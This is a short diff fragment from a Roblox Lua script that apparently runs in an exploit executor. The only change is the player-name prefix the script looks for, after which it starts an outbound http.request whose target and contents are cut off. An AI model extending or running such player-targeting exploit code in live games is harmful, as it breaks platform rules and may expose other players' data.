@@ -136,7 +136,7 @@ end
 for i,v in next, game:GetService("Players"):GetPlayers() do
 --coroutine.wrap(function()
 if v ~= lp then
-if string.find(v.Name,"LeFrancaisScripter_") then
+if string.find(v.Name,"RobloxKnightBOT_") then
 coroutine.wrap(function()
 local HttpService = game:GetService("HttpService")
  http.request({
